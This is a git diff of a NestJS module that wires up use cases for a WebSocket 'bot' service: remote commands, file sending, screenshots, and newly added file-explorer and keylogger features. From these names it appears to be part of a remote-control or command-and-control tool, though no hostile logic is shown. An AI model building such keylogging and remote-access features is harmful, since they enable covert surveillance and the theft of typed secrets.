@@ -7,10 +7,14 @@ import { WsBotLeavesUseCase } from "./application/ws-bot-leaves.use-case";
 import { WsBotConnectClientUseCase } from "./application/events/ws-bot-connect-client.use-case";
 import { WsBotDisconnectClientUseCase } from "./application/events/ws-bot-disconnect-client.use-case";
 import { AuthModule } from "../auth/auth.module";
-import { WsBotSendScreensUseCase } from "./application/events/ws-bot-send-screens.use-case";
+import { WsBotScreenshotUseCase } from "./application/events/ws-bot-screenshot.use-case";
 import { WsBotSendCommandUseCase } from "./application/events/ws-bot-send-command.use-case";
 import { WsBotSendFileUseCase } from "./application/events/ws-bot-send-file.use-case";
 import { ClientModule } from "../client/infrastructure/client.module";
+import { WsBotSendExplorerUseCase } from "./application/events/ws-bot-send-explorer.use-case";
+import { WsBotKeyLoggerUseCase } from "./application/events/ws-bot-keylogger.use-case";
+import { SchemasModule } from "@/src/repository/schemas.module";
+import { WsClientModule } from "../ws-client/ws-client.module";
 
 @Module({
   providers: [
@@ -21,20 +25,29 @@ import { ClientModule } from "../client/infrastructure/client.module";
     WsBotSendMessageUseCase,
     WsBotConnectClientUseCase,
     WsBotDisconnectClientUseCase,
-    WsBotSendScreensUseCase,
+    WsBotScreenshotUseCase,
     WsBotSendCommandUseCase,
     WsBotSendFileUseCase,
+    WsBotSendExplorerUseCase,
+    WsBotKeyLoggerUseCase,
   ],
   exports: [
     WsBotSendMessageUseCase,
     WsBotConnectClientUseCase,
     WsBotDisconnectClientUseCase,
-    WsBotSendScreensUseCase,
+    WsBotScreenshotUseCase,
     WsBotSendMessageUseCase,
     WsBotSendCommandUseCase,
     WsBotSendFileUseCase,
     WsBotRepository,
+    WsBotSendExplorerUseCase,
+    WsBotKeyLoggerUseCase,
   ],
-  imports: [forwardRef(() => AuthModule), ClientModule],
+  imports: [
+    forwardRef(() => AuthModule),
+    forwardRef(() => WsClientModule),
+    ClientModule,
+    SchemasModule,
+  ],
 })
 export class WsBotModule {}
